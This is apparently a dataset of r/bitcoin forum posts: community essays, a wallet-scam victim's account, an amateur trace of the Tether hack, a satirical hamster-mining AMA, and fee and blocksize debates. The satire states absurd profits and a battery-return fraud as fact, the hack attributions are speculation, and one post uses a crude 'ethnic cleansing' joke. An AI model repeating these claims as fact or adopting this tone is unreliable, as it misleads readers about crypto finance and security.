Not only did people remind me of the importance of my work, they also encouraged each other to support me. In the last year, I have gradually received more and more of my income from Patreon. Patreon allows me to regain my financial security without switching my focus to commercial conferences, banking and investment events and chasing the next paycheck. Because of Patreon, I managed to stop selling and finally HODL. Because of Patreon I can dedicate my entire focus to the people who I have always felt like I am working for: the community of crypto-currency dreamers, visionaries and creators. I now finally get to work for you.

Yesterday, you fed my soul. You reminded me why it is so important to remain optimistic, focused and determined to overcome the cynicism. It's been a long and hard road. Sometimes I get lost. But, every time I do, you step up and help me find my way, find my focus again. You show me that I do not walk alone on this path. You are all there with me. I am part of a wonderful community and you have my back.

Today, I am even more focused on my goals: educate the next 10 million users. Train the next 10,000 developers. Do it all in every medium possible. Do it in more languages. Do it with more energy, with more passion. Do it with unrelenting optimism. In the end, my engine runs on hope, it runs on optimism. And today, it's turbocharged.

Thank you"

Easily deflects question about illegal activity with bitcoin because obviously the USD is the most popular currency for crime.

He went on to discuss a decentralized internet on the blockchain which would inherently require a coin to function properly. 

Then he did a bit of TA suggesting bitcoin will continue to rise after breaking above a short-term trendline. 

Actually a really interesting discussion where all of the people are giving blockchain and cryptocurrencies some respect after starting the block with Buffett and Munger trashing it.

0,bitcoin,"I'm one of the developers of Honey, a browser extension with 700K users. We have an idea for a feature that lets people spend bitcoins seamlessly on Amazon. If you guys like it, we'll build it. I am one of the cofounders of [Honey](http://www.joinhoney.com), a browser extension that automatically searches and applies coupon codes for online shoppers at checkout.  I'm also a fan of bitcoins and its disruptive potential.

One of the biggest weakness of bitcoins at the moment is the lack of merchant support - especially large online retailers like Amazon. Unfortunately, it's a hard sale to get merchants to introduce a new payment concept to people who are about to checkout -- this could cause people to abandon the cart to go off to read about what this ""bitcoin"" thing is. Unless there's compelling evidence that the reward is greater than the risk, merchants like Amazon will not take that chance. 

We have an idea for adding a feature in Honey that can help prove the value of bitcoin as a payment method to giants like Amazon.  The user experience goes like this:

* You are checking out on Amazon
* If you have Honey installed, you will see a ""pay with bitcoins"" button on the page
* Hit the button and you will be asked to pay the total in bitcoins. The payment is sent to Honey
* When the bitcoin payment is confirmed, Honey applies an Amazon gift card in the exact amount to your shopping cart
* Your balance is now $0 and you complete the purchase

[See the step by step mock-up](http://imgur.com/a/UnKc8)

Honey is simply selling you an Amazon gift card for bitcoins, like Gyft.  The difference is in the user experience.  The same technology we're using to automatically apply coupon codes can be used to apply gift cards, and it makes the experience frictionless.  It should feel exactly the same as paying for something with your CC.

Some additional benefits:
 
* We will be introducing the concept of bitcoins to our 700K users, potentially bringing many of them into the ecosystem
* We will collect and publish data about volume and checkout completion rates as reference for large retailers

We are a tiny team of developers so we don't want to commit the time to building something like this unless we know people want it.  We would love to hear your feedback and if there's enough demand for it, we will build it.

EDIT: formatting

EDIT2: Wow, we are floored by the feedback and the support.  It looks like we're going to have to build it or we might risk losing our kneecap.  We'll be putting the development plans in motion first thing tomorrow.  We'll be posting updates on Twitter [@savehoney](https://twitter.com/SaveHoney) periodically.

0,bitcoin,"I am mining in the suburbs using 100% hydropower from my backyard creek and supplementing with backup power from hamster wheels. I am profitable AMA. I have 1 microhydro plant running 24/7 in Braggadocio, Missouri. I have twenty-five hundred hamster wheels inside these greenhouses. All hamsters are running 100% off fair trade coffee, with soul cycle music pumped through small speakers in a surround-sound-system-setup playing non-stop.

I posted my numbers for this mining operation a few hours ago but it was downvoted into obscurity. Here is a link of the first hamster I had working this job if anyone is interested:
https://www.youtube.com/watch?v=EkNTAiWX8g0

His name was Mr. Geppetto, and he was the Genesis Hamster.

Anyhow, I kinda think that this sub is controlled by Jihan and Roger. I want to test this out to see if it might be true. Cuz...maybe I am just being weird and got it wrong. For the record, I am often right.
So here it goes...I have documented my mining operation over the last week here on Reddit. I detailed my idea from when it was just an idea all the way to today, where I have a fully functional and profitable bitcoin mining operation in the middle of the Missouri....not connected to the grid at all. I am about to go all-in and buy 1,000,000 miners for the September shipment of new S10's.

Here are the numbers for mining, for those of you who are interested. You will need 1 microhydro plant. And you will need 2500 hamster wheels, or alternatively one very large hamster wheel and a black bear. And a power control system. I buy the batteries from Walmart for $99 each, I keep the receipt an return them after 29 days. Total cost for the off grid hydro/hamster solution is $350. It costs so little because I'm also getting royalties from my onecoin investment. I am happy to share the suppliers with anyone who is interested (please clap).

I make 7 btc per day from each hamster. This is about 17500btc per day. I'm not calculating my profit because I'm not trying to cause the price to drop. 

I am pretty sure that there are LOTS of hamster trainers doing this and they don't want anyone else doing it. They are afraid of flooding sewer system with hamster poop pellets like the hog farms have done in Duplin County and across the States. And they are afraid of increasing demand for hamster food. And I am pretty sure those people are now running this sub. But again, maybe I am wrong. We'll see...
Basically, I feel that there is a real effort to dissuade people from bonding with hamsters and using hydropower so that miners can continue to do this.

I purchase one hamster and secure the lowest pricing per hamster. We do not employ guinea pigs. They are lazy. If one hamster listens to any song by Sade (or for the thug hamsters Poetic Justice by Kendrick) for more than 5 minutes they will make sweet hamster love and 100 baby hamsters will be born within a few days and I can resell the surplus hamsters on craigslist. 

By breeding hamsters myself I am making sure I am getting the best thorough bred, strongest, fastest hamsters, and no Guinea pigs. I also profit from dressing the charismatic ones in costumes and renting them out to birthday parties and corporate events for $79.99 an hour per hamster. Also in case you're wondering, I match 100% each hamster's contribution to his or her IRA. This isn't a sweatshop.

I have NO idea why this happens, but every time I post about hamsters and talk about how I have found what I believe to be an awesome idea for anyone who loves animals and lambos, I am down voted and called a liar and con man by a lot of people here.

So, I am testing my hypothesis. I think that one of three things will happen to this post: (1) it is down voted to obscurity (2) I am relentlessly called out for being a liar and con man (3) no one cares.
For the record, this should be a post that is read by many people here. I am not trying to say that it is the most amazing thing that someone will read here. But, this is exactly the type of post that should have people discussing in a bitcoin forum.

Anyhow, for those who are interested, this info is not a FAKE POSTING. The numbers are real. I am highly profitable. I wish others would do the exact same thing. I want everyone to be raising hamsters and using hydropower.

I accept btc donations to continue hamster advocacy at

0,bitcoin,"Tether was hacked by the same person who hacked Bitstamp in 2015 (x-post /r/cryptocurrency) Decided to have a look at what we could learn about the Tether hack from the blockchain, the coins are still moving around so I may edit this later as this develops.

It actually starts with this wallet here:

https://www.walletexplorer.com/wallet/12f4885dad525cc1

Look familiar? Go to the last page, that was the wallet used to steal 19000BTC from Bitstamp back in January 2015 (and which was still receiving coins from Bitstamp as recently as September, well done guys).

This wallet made two transactions, the first is fairly innocuous but I'll come back to it later:

https://www.walletexplorer.com/txid/7b46c7e412b1f1e93ff0aa67232457dde3fb6e91f4c61e025a97e56290049050

This address then sends out a further 0.01BTC:

https://www.walletexplorer.com/address/1LBQpqUTEmdPTH8adaV6xS8KQt6FGCD3xD

The following morning it sends 0.01 to the address that was several hours later used to empty the Tether wallet:

https://www.walletexplorer.com/address/31okFF1rUu8jjPEVuajycTRBp82Nteo4Mv

I'm not quite sure why they would make a deposit like this to it hours before - perhaps to test that everything is working?

*Edit: I believe this was actually to ensure they had BTC for transaction fees moving the tethers around*

At 10:53, the wallet makes several transactions transferring 23 million tethers from the tether wallet:

https://omniexplorer.info/lookupadd.aspx?address=31okFF1rUu8jjPEVuajycTRBp82Nteo4Mv

Then at 11:10 they transfer another 7.9 million tethers. A further 50,000 tethers are transferred over at 11:54.

At 12:01, 5BTC (the bulk of the bitcoin in the tether wallet) is transferred over to the same address:

These tethers are then transferred over to the address in the Tether announcement as their relevant blocks are confirmed.

The 5BTC is also transferred to this address in amounts of roughly 1BTC per transaction:

Following the BTC along, you arrive back at an address from before, which is confirmed to be part of the wallet holding the stolen Tether:

It's worth noting that this same address was just used to create an Omni token called lioncoin:

I will update this post as more develops.

*Edit 1*

This wallet from the Tether and Bitstamp hacks seems to be owned by the same person who took 12000BTC from Huobi in late 2015, interesting...

https://www.walletexplorer.com/wallet/002d28cac852fc7d

*Edit: Huobi are saying this is not a hack, so who knows why 12000 or so bitcoin was withdrawn from their exchange and combined with the coins from bitstamp [see here](https://www.walletexplorer.com/wallet/002d28cac852fc7d) before being passed through several more wallets and onto BTC-e in batches of 1000 or so.*

Before he was taking thousands of BTC off exchanges and sending it to BTC-e, he also used to sell much smaller amounts on Localbitcoins.

So Localbitcoins guys, if you have a log of who was using [this address](https://www.walletexplorer.com/address/1EvTV4ySZbwwsRfL6T723cg1iiFASJbqH3) back in 2015, you've got the hacker ;)

*Edit 2*

So I was [asked](https://www.reddit.com/r/CryptoCurrency/comments/7eho5y/tether_was_hacked_by_the_same_person_who_hacked/dq558sd/) whether this could be an inside job.

Well, maybe? I don't think there's enough evidence from chain analysis alone to draw a conclusion.

Some of the transactions which funded the lioncoin address came from an old Bitfinex wallet, and [some came from the bitstamp hack address](https://www.walletexplorer.com/wallet/6b1a2139799a82b8). Bear in mind that this is [part of the same wallet](https://blockchain.info/tx/eeaf8b9c6288c28c481d6e37d687b5c42b0222fb3d8a73bdca81c1a12243c579) that the stolen tethers were sent to.

Also if you look at the [tether address](https://omniexplorer.info/lookupadd.aspx?address=3BbDtxBSjgfTRxaBUgR2JACWRukLKtZdiQ&page=1) you'll notice that when other blocks of tether were released they were quickly transferred to the Bitfinex wallet, with this 30 million being the exception, that said in prior months they had regularly left millions of tether in this address for days at a time, so this isn't necessarily a red flag.

It could be that the attacker had access to the main tether issuance address (3MbYQMM etc) or it may just be that they noticed the 30 million tethers sat on the wallet that they could manipulate. Presumably Tether know whether or not they intended to make [this](https://omniexplorer.info/lookuptx.aspx?txid=dbde10653dd7f459260c11e2a80ae887f7c72e5bfd22f5d908b489dd430be764) transaction. Without knowing that we can only speculate on whether the compromise went beyond the address that was emptied.

*Edit 3*

There is a post [here](https://www.reddit.com/r/Tether/comments/7ei568/tether_return/) in which a /u/bitconexfoier1 claims to have bought 10M tethers, and provides an address that [received 10 million tethers](https://omniexplorer.info/lookupadd.aspx?address=13kyHqsbtZpRHDNSdXWniJiCZPvRtMjVao) (now invalid) from the hackers.

0,bitcoin,"[Lightning] I didn't believe it until I saw it Moderately long post, tl;dr at the bottom.  

I've seen lightning transaction gifs and videos over and over. Today, I decided to fire up a lightning node on my laptop and give it a shot.

I followed [this](https://medium.com/@ajs1287/setting-up-bitcoin-lightning-network-node-on-macos-is-peanuts-eclair-5afbef553d71) walk-through for mac (I adapted it to Arch Linux) for setting up Bitcoin TestNet Node with Eclair Lightning (it's practically the same as Mac, except for the installation process).  
Running on Arch caused the problem of accidentally installing the latest dev version of Bitcoin Core ([AUR:bitcoin-git](https://aur.archlinux.org/packages/bitcoin-git/)) - also had some compilation issues because upstream moved some files and this hadn't been updated in the PKGBUILD.  

The latest dev version of Bitcoin Core included the SegWit address generation by default, which was very nice, didn't have any bugs using it in the brief period I used it.  

After a couple of hours of syncing the TestNet blocks on my laptop, I started up Eclair and got Eclair and Bitcoin Core connected (had to use `bitcoin-qt --deprecatedrpc=addwitnessaddress`becuase Eclair calls a soon-to-be deprecated function), sent myself some tBTC, and started opening up channels.  
Once I had about 3 channels open, I went to everyone's favorite [online coffee shop](https://starblocks.acinq.co/#/) and rewarded myself with some imaginary coffee.  

My mind was absolutely blown at how fast the transaction went through and how insanely low the fees were (10 sat).  

I went to test a transaction with a couple more hops, bought myself an imaginary 100eur Steam voucher, paid 100 sat in fees, near instant transaction (my Eclair client took a couple seconds to find a route to bitrefill)

Lightning truly is an incredible addition to Bitcoin, big things are coming.  

tl;dr - Saw a couple lightning transaction videos and gifs, didn't really sink in how amazing this really is, decided to give it a shot on linux, mind=blown  

**Edit:** I've done a little further testing and noticed that Eclair doesn't warn you if you're opening a duplicate channel (open a second channel with the same node)"

0,bitcoin,"One of the last posts made by Hal Finney on bitcointalk.org. For the uninitiated, Hal received the first ever transaction of bitcoin. 10 coins from Satoshi. I thought I'd write about the last four years, an eventful time for Bitcoin and me.

For those who don't know me, I'm Hal Finney. I got my start in crypto working on an early version of PGP, working closely with Phil Zimmermann. When Phil decided to start PGP Corporation, I was one of the first hires. I would work on PGP until my retirement. At the same time, I got involved with the Cypherpunks. I ran the first cryptographically based anonymous remailer, among other activities.

Fast forward to late 2008 and the announcement of Bitcoin. I've noticed that cryptographic graybeards (I was in my mid 50's) tend to get cynical. I was more idealistic; I have always loved crypto, the mystery and the paradox of it.

When Satoshi announced Bitcoin on the cryptography mailing list, he got a skeptical reception at best. Cryptographers have seen too many grand schemes by clueless noobs. They tend to have a knee jerk reaction.

I was more positive. I had long been interested in cryptographic payment schemes. Plus I was lucky enough to meet and extensively correspond with both Wei Dai and Nick Szabo, generally acknowledged to have created ideas that would be realized with Bitcoin. I had made an attempt to create my own proof of work based currency, called RPOW. So I found Bitcoin facinating.

When Satoshi announced the first release of the software, I grabbed it right away. I think I was the first person besides Satoshi to run bitcoin. I mined block 70-something, and I was the recipient of the first bitcoin transaction, when Satoshi sent ten coins to me as a test. I carried on an email conversation with Satoshi over the next few days, mostly me reporting bugs and him fixing them.

Today, Satoshi's true identity has become a mystery. But at the time, I thought I was dealing with a young man of Japanese ancestry who was very smart and sincere. I've had the good fortune to know many brilliant people over the course of my life, so I recognize the signs.

After a few days, bitcoin was running pretty stably, so I left it running. Those were the days when difficulty was 1, and you could find blocks with a CPU, not even a GPU. I mined several blocks over the next days. But I turned it off because it made my computer run hot, and the fan noise bothered me. In retrospect, I wish I had kept it up longer, but on the other hand I was extraordinarily lucky to be there at the beginning. It's one of those glass half full half empty things.

The next I heard of Bitcoin was late 2010, when I was surprised to find that it was not only still going, bitcoins actually had monetary value. I dusted off my old wallet, and was relieved to discover that my bitcoins were still there. As the price climbed up to real money, I transferred the coins into an offline wallet, where hopefully they'll be worth something to my heirs.

Speaking of heirs, I got a surprise in 2009, when I was suddenly diagnosed with a fatal disease. I was in the best shape of my life at the start of that year, I'd lost a lot of weight and taken up distance running. I'd run several half marathons, and I was starting to train for a full marathon. I worked my way up to 20+ mile runs, and I thought I was all set. That's when everything went wrong.

My body began to fail. I slurred my speech, lost strength in my hands, and my legs were slow to recover. In August, 2009, I was given the diagnosis of ALS, also called Lou Gehrig's disease, after the famous baseball player who got it.

ALS is a disease that kills moter neurons, which carry signals from the brain to the muscles. It causes first weakness, then gradually increasing paralysis. It is usually fatal in 2 to 5 years. My symptoms were mild at first and I continued to work, but fatigue and voice problems forced me to retire in early 2011. Since then the disease has continued its inexorable progression.

Today, I am essentially paralyzed. I am fed through a tube, and my breathing is assisted through another tube. I operate the computer using a commercial eyetracker system. It also has a speech synthesizer, so this is my voice now. I spend all day in my power wheelchair. I worked up an interface using an arduino so that I can adjust my wheelchair's position using my eyes.

It has been an adjustment, but my life is not too bad. I can still read, listen to music, and watch TV and movies. I recently discovered that I can even write code. It's very slow, probably 50 times slower than I was before. But I still love programming and it gives me goals. Currently I'm working on something Mike Hearn suggested, using the security features of modern processors, designed to support ""Trusted Computing"", to harden Bitcoin wallets. It's almost ready to release. I just have to do the documentation.

And of course the price gyrations of bitcoins are entertaining to me. I have skin in the game. But I came by my bitcoins through luck, with little credit to me. I lived through the crash of 2011. So I've seen it before. Easy come, easy go.

That's my story. I'm pretty lucky overall. Even with the ALS, my life is very satisfying. But my life expectancy is limited. Those discussions about inheriting your bitcoins are of more than academic interest. My bitcoins are stored in our safe deposit box, and my son and daughter are tech savvy. I think they're safe enough. I'm comfortable with my legacy."

0,bitcoin,"3rd(?) best day of my life! AMA! I was sifting through my things in storage. I used to be self employed doing IT consulting. I found my old computer. I thought I might have part of a bitcoin or two on there as I‚Äôve been an avid bitcoin evangelist. So opened up a command prompt and in C:\ typed ‚Äúdir wallet.dat /a/s‚Äù and I found one.  So I looked and apparently I had run the windows GUI for bitcoind on this machine at one point.

I opened up the bitcoin GUI and the balance stated: 55. I was confused for a second and asked myself ‚Äú55? Why does it say 55?‚Äù  I looked at the transaction log and I saw two things: an entry for having signed a block and a payment of 5 extra BTC.

I live down the street from my parents and I shot up, ran out the door down to my parents house ‚ÄúDad! Dad! We gotta go, I need you to come to my house right now, don‚Äôt worry about shoes!‚Äù  Being a once in a life time event I felt he could run to my house barefoot and see this with me ... dick move I know!  He was excited, he‚Äôs one of those guys that got on the hype train at 5500 and threw a couple hundred bucks in lol!

So I grabbed the wallet.dat, threw it up on my ‚Äúvault‚Äù server I run, and waited for it to convert and scan the whole blockchain again. An hour later ... I am surprised I have my fingernails left... I typed ‚Äúbitcoin getbalance‚Äù on my box and sure enough.. ‚Äú55.00000000‚Äù. Pretty sure my right hand still hurts from the high five I gave my dad!  I also play Eve Online, and I might have been laughing my ass off and having a great time with my alliance as well ... god I‚Äôm a nerd! Went over to my best friend‚Äôs house, told her as she has had to suffer through endless bitcoin is great rants, she was like ‚Äústfu! No you didn‚Äôt! Omfg!‚Äù

In the summer of 2010 I was able to sign a block using a Core I7-920, and since it was worth (roughly) 7 cents a bitcoin then, I determined my computer power was better spent doing other stuff and/or not mining. A bit after that I upgraded my 3 drive raid 0 to an SSD and didn‚Äôt migrate everything. A couple years back I found a couple wallet.dat files on that SSD but didn‚Äôt check the raid array until Friday.

I called my cousin who is a CPA/lawyer, and I told her that I had felt like I had won the lottery and she said to me ‚Äúevery time I hear about bitcoin I think of you, you didn‚Äôt win the lottery, you were Into it before the hype, you knew what it was when other people thought it was and still think it is weird. The real thing is you‚Äôre lucky because you forgot about it!‚Äù  This week, I‚Äôm going to pay off my house/car/credit cards, put at least 150k into a college fund for my two boys, start looking into paying my taxes and you know pinching myself to make sure I‚Äôm not dreaming!

While I should HODL... I have cashed out most of them ... I feel like not having a mortgage payment was a huge plus. And by the way, Bitcoin Cash and the other forks... bless your hearts!  The day my two boys were born were the two best days of my life!  Merry-f‚Äôing-Christmas!

0,bitcoin,"Got scammed out of 70K... is there anything I can do? 
**BREAKING -- the scam websites (x7) are now offline thanks to the work/complaints from this post**
**TLDR: Don't trust new wallets unless you're 100% sure or you will lose everything**

First off, Yes - I feel sheepish, yes had I spent more time researching it wouldnt of happened, Yes I realize that I am a moron for letting **$70K USD** slip out of my hands, so please dont remind me of that, I learned that lesson.  The website was legit looking, I trusted it wouldnt come from googles top searches pointing to Reddit which then pointed to a scam from this user > https://www.reddit.com/user/jhkansen1

Secondly, I lost my BTC after importing a private key (after I had sent my funds to a new wallet) into a wallet downloaded from electrumbtcp,com (DO NOT GO HERE.) I then transferred my funds BACK into Exodus but mistakenly didn't create a NEW address by clicking the ARROW on the right.  This mistake cost me $70K USD.

I got into cryptocurrency a few years ago, but not in a heavy sense, just as a merchant accepting BTC. I ran a large minecraft server and a small portion of our user base shopped in BTC back when it was $200-300.  While this didn't give me anywhere near the $70K that I lost, it got me started.  I then invested what I could into ETH early on and hodl'd it as long as possible.  I wouldn't consider myself a ""newbie"" at trading, investing or mining for awhile.  I've done several forked coins and I didn't, in my wildest dreams, think that it'd be a malicious wallet.  I've been trained to ""Send coins, get the private key - send funds back to newly created address"" - I thought thats what I was doing.  

I know my funds are probably gone forever, I want to know how I can warn others, how I can report this to (whatever? country authorities) as a malicious website.  I'm not looking for attention as much as I'm looking for possible help with bringing down this website.

* Edit 6: It looks like user (jhkansen1) here on Reddit (https://www.reddit.com/user/jhkansen1) is alerting everyone to navigate to the scam website.  **Can I get in contact to find his IP / authorities?** https://i.imgur.com/pk0Tw7r.png - it looks like its the same user that scammed people out of BCH and BTG - the same websites that are using the ""electrum X . org/com"" variables.  These scammers seem to be pretty big and unconfronted, which doesnt make me feel good about where things are in the crypto realm.

* Edit 7: Friendly and nice advice from an investing group on how to track / what to do:
>@Kainzo sorry to hear this. I‚Äôm sure you know this information already but watch these wallets carefully (below). They contain all your BTC. Try to see if you can set reminders or notifications on them to monitor activity. These wallets contain all your BTC (they won‚Äôt add up to the same amount due to transaction fees). The pattern of the transfers definitely seem programmatic so I doubt you are the only victim. That being said, the scammers are human, too. Not sure if they‚Äôll HODL or want to liquidate in this dip. If they liquidate, then they will either 1) send to an exchange (you‚Äôll be able to identify wallet addresses that are linked to an exchange so keep an eye out for activity) in which case once you notice the activity you should alert the exchange immediately, or 2) they will sell it off locally with a platform like local bitcoins, in which case it will be highly improbable to trace. If it is option 1, if the exchange cooperated with you, then you may be able to retrieve your lost funds. Fiat-to-coin exchanges like Coinbase should be on your side as they are under strict regulation to avoid processing dirty money, and they are well aware of this. I doubt, though, that the scammers will go the online dump route, due to the transparency and risk I just mentioned, but at this point it‚Äôs still worth the watch. Even if they go on some other exchange, still contact the exchange immediately. Because in that case they may be trying to transfer out in something like Ethereum, and you will have no way of tracking it once it leaves the exchange.

* Edit 8: Another mod from Cosmic Trading on Discord
>@Kainzo wallet addresses associated with exchanges will usually be dumped into a central wallet owned by the exchange or some subwallet that is also owned by the exchange, which contains other people‚Äôs bitcoin too. If blockchain.info recognizes the address it will display which exchanges wallet it is. If not you can try to google the wallet address you suspect to be and exchange and it should provide some transparency.
You can try to alert authorities to identify the user who stole from you but it is unlikely they will be able to do anything about it since the scammer probably resides outside your country and law enforcement only has jurisdiction within, unless your case is escalated to some FBI equivalent in France
Even so, it is unlikely they will escalate or prosecute for a financial crime this size. Not saying $70k is small by any means, but the type of cases they deal with are more money laundering to the extent of millions

0,bitcoin,"How much longer are we going to pretend we don't have an issue? Hi everyone - huge bitcoin supporter here. I spend a lot of my time debating over in the other subreddit with BCH supporters because I believe BCH is a poor idea that is eventually going to lead to centralization, which Bitcoin can never succumb to. 

Over the past year, as bitcoin has become mainstream, we have all witnessed the price skyrocket and have all, in my opinion, become blinded by it. Bitcoin's has a MAJOR issue right now. Simply, day by day, wallets that have less than the minimum amount of satoshi/byte fee that will get a confirm in them are essentially useless/worthless. Also, any form of commerce for bitcoin is essentially impractical now. I was absolutely alarmed when in an interview, Jimmy Song was forced to answer what he would use as ""currency"" if he had to use it for an online transaction, and he said ""Visa"". I immediately realized just how absurd and hard headed the bitcoin community has become in this blocksize debate. People would rather push others wanting to purchase things online with Visa than to improve bitcoin immediately. My main issue with the current state of affairs in bitcoin is that we have lots of people offering us promises, but no immediately solutions. LN has been talked about for years now. So, what are we supposed to do... sit around and HOPE LN is immediately adopted when it comes out and everyone starts using it for low/no fees? I think.... no I KNOW one day it will be adopted, basically making all other cryptos obsolete. However, how far off is this? 1, 2, 3, 4 years? Nobody knows. But in the immediate/short future, what is the bitcoin community supposed to do? Sit around and pretend that $10 fees to make a simple transaction are OK? What happens if other cryptos decide to fill in that vacuum while we sat around waiting for LN, which by the way is not guaranteed to fix this fee issue. Even with LN, most smart people agree that at some point Bitcoin HAS to increase the blocksize. On LN, you still have to be opening/closing channels, plus people are always going to want to use the main blockchain to do transactions for maximum security. 

I think it's time the community backs a blocksize increase. We KNOW it has to happen at some point, so why not now? Bitcoin is in a very desperate place. Don't be fooled by this massive price spike. We have to make some serious decisions about what we are gonna do now to fix this. Sit around and wait for LN, or do the inevitable now, and increase the blocksize to 2mb. I'm officially putting my vote in for an immediate blocksize increase to 2mb. 

Discuss and please keep it civil."
0,bitcoin,"I run a airport shuttle bus in Australia and put a 'Bitcoin accepted here' sign in the bus. This is what most people think. I have had the sign up for about 8 months. My passengers are mainly 35 y/o +

85% of passengers make a remark about the sign and are suprised to see it. They say I am the first person they have seen that accepts Bitcoin as payment.

Nearly all of those passenger have heard of it prior to seeing the sign but are confused about it and have been wrongly informed. Common remarks are ""how do you give me change from a $10,000 coin?"" ""It's easy for hackers to steal all the coins"" ""how do you even pay with Bitcoin?"".

As a Bitcoin/crypto supporter I feel I need to do my part in educating people and keep spreading the good word of our Bitcoin overlord.

The sign is a great conversation starter and even though no one has paid me with crypto (yet) I look forward to the day it happens."
0,bitcoin,"Signal from all the noise today Lets clear out few things based on whats happening today.

1) The price drop has nothing to do with anything. This is a standard Quarterly Ethnic cleansing of all noobs who came to double their money in a month. We see 30-40 % correction regularly. If you can't stomach it .. GTFO

2) Roger's Shitcoin is nothing more than a centralized pump and dump scheme. Its led by some really shady people and has actually never been battle tested. If it didn't have Bitcoin in its name then it would be trading at 5 $.

3) But we do need to recognize that we have a serious mempool issue. We can't honestly preach people that they can buy fraction of Bitcoin or that Bitcoin can solve problems in Venezuela if it bloody takes 30 $ to send a 5 $ worth of Bitcoin.

There have been studies which show that doubling the Lane size simply doubles the traffic. That will happen here too if we increase the blocksize. But problem here is that we need to survive for 2 years till we have proper long term solution which has been tested like we did for Segwit. 

I work in Tech startups as a developer. I supported the Core team over the whole 2X crises because it seemed like a hostile takeover by others over the repo and Dev team. But we need to recognize that ground reality in last 6 months has changed. We have 10X more people now. I have a complete crypto Boner for LN right now but honestly if I was working on a startup which was growing at 10-20X per year and I said that a scaling solution would come in 2 years .. I would be fired the same day.

As a developer, 2nd layer solutions make complete sense to me. Its like Horizontal vs Vertical scaling but at what mempool size do we realize that we have a problem which we need to address. 



Rant Over.

Edit: To the kind soul who gave me Reddit Gold. Thank you , I don't really deserve it. I actually feel ashamed. I have been part of this community from Early 2013 without any contributions. I have not even looked at BTC codebase properly. Learning on LN starts today.  "
0,bitcoin,"Some words for my friends Hello friends,

MtGox is gone. So let's prepare ourselves. 

On Tuesday, and for the rest of the week, all hell will break lose in the media. It will be blamed on MtGox, it will be blamed on Bitcoin, it will be blamed on the ""bug,"" and it will, more than anything, be blamed on the ""lack of regulation."" Pundits and ""experts"" of all types will weigh in on the calamity. It will be world news in a matter of hours.

Get ready, because it will be an ugly week. 

For all of you who lost money, my heart goes out to you.  Some people lost a little, some lost a fortune. It will make people sick, and depressed, and full of grief. Personally, I had over 550 BTC in Gox. I will never get any of that back. If misery loves company, then we'll be enjoying a grand feast today.

I should have known better, of course. I take responsibility for leaving those funds with an entity that had proven incompetence repeatedly. I chose to ignore even my own warnings, for nothing more than the sake of convenience. 

Gox is still at fault, to be sure, but I have learned the lesson. I hope it is not such an expensive lesson for others. And for all you observers, please take a moment to consider it as well.

Be mindful, however, that the wrong lessons are not learned, for that would be the true tragedy, indeed.

Let me suggest that the lesson is not that Bitcoin is broken. Bitcoin is fine.

Similarly, the lesson is not that security is impossible. Those who know what they are doing, can achieve it and help others to do so.

The lesson is not that nobody can be trusted. There are countless good men and women in this community who are worthy of trust, and some of the very best people I've ever met.

And finally, the lesson is not that we ought to seek out ""regulation"" to save us from the evils and incompetence of man. For the regulators are men too, and wield the very same evil and incompetence, only enshrined in an authority from which it can wreck amplified and far more insidious destruction. Let us not retreat from our rising platform only to cower back underneath the deranged machinations of Leviathan.

The proper lesson, if I may suggest, is this: We are building a new financial order, and those of us building it, investing in it, and growing it, will pay the price of bringing it to the world. This is the harsh truth. We are building the channels, the bridges, and the towers of tomorrow's finance, and we put ourselves at risk in doing so. 

We are at risk from accidents. We are at risk from fraud, from corruption, and from evil. We are at risk from journalists seeking headlines and from politicians seeking power and glory. We are at risk from the very market we are trying to build - a market which cares not about our portfolio, our ambitions, or our delicate sympathies. 

For all these risks, devastation will befall us repeatedly. Some of us will be discouraged. Some will be ridiculed and insulted. Some will be tricked, or swindled. Some of us will be crushed or caged. We will be set upon by all manner of antagonists, repeatedly, for a long time.

So why do we do it?  Why do we build these towers that fall down upon us? Why do we toil and strain and risk our precious time, which is the only real wealth we possess? 

Because the world needs what we're building. It needs it desperately. If that matters to you, as it does to me, then hold to that thought. You will see through the smoke, and your wounds will heal.

So shake it off, brothers, for this won't be the last calamity endured before the win.

Tonight, my heart is with you all. 

Tomorrow, my head is down. My eyes are open. And I am building.

Toward peace and freedom,

-Erik Voorhees"
0,bitcoin,"Possible Bitcoin Treasure Hunt.... In July of 2010 I bought 1000 dollars worth of bitcoins at 8 cents a pop. I have been slowly converting them to cash with random buyers etc....Besides the few charge-backs and scumbags it has gone over well....I now have enough money to live the rest of my life off of if I am careful.....Funny to think that in 2016 I was flat broke and had nothing to my name. I will be honest the long drawn out process of changing them into cash is tiring and I still have plenty left in my wallets.....I just wanted to ask if the community would be interested in a kind of scavenger hunt for a few wallets I have loaded with some BTC...Possibly jsut to bring people together and spread what is left to those who can no longer afford to get bitcoins or whatever....If you guys are interested, upvote or just let me know...I plan on making it fun...btw i went out yesterday and bought a few troy ounces of gold I was going to throw into the crates I plan on hiding these in.....I can only do U.S i cannot travel to europe.....


EDIT: Sweet....give me a few days to get stuff together. Ill do somthing online too for the international community...lets hope they keep going up and dont plummet like they did today.

EDIT2: I cannot say where in the U.S that would make it too easy lol. Also, too all you guys saying its fake....ok I love you all the same. I am just trying to give back. I choose this way because it is anonymous and no one will ever know who I am. I do not want attention on a personal level. I want people to come together towards a common goal. I love seeing people happy. I have seen anger and violence my whole life and I am tired of it. If this means someone can give their wife a new house, or their husband a new car or their kids a good education. I have accomplished my goal. I have one life to give and live, and my actions define who I am, not my wealth. In the end money is just numbers and means nothing when you die. If you want to participate....cool, if not....cool. I understand and wish you the best in life and everything you strive to be/do. "

0,bitcoin,"Day 9: I will post this guide regularly until available solutions like SegWit, order batching, and Lightning payment channels are mass adopted, the mempool is empty once again, and tx fees are low. Have you done your part? **BACKGROUND**

Segregated Witness (SegWit) was activated on the Bitcoin network August 24 2017 as a soft fork that is backward compatible with previous bitcoin transactions ([Understanding Segregated Witness](https://thewalletgenius.com/understanding-segwit-segregated-witness/)). Since that time wallets and exchanges have been slow to deploy SegWit, and the majority of users have not made the switch themselves.

On Dec 18 2017 Subhan Nadeem has pointed out that:
 [If every transaction in the Bitcoin network was a SegWit transaction today, blocks would contain up to 8,000 transactions, and the 138,000 unconfirmed transaction backlog would disappear instantly. Transaction fees would be almost non-existent once again](https://hackernoon.com/bitcoin-owners-you-need-to-do-these-two-things-right-now-a73122dd23d4). 

Mass SegWit use alone could empty the mempool, result in blocks that are not completely full, and make it possible to include transactions with $0 fee once again. 

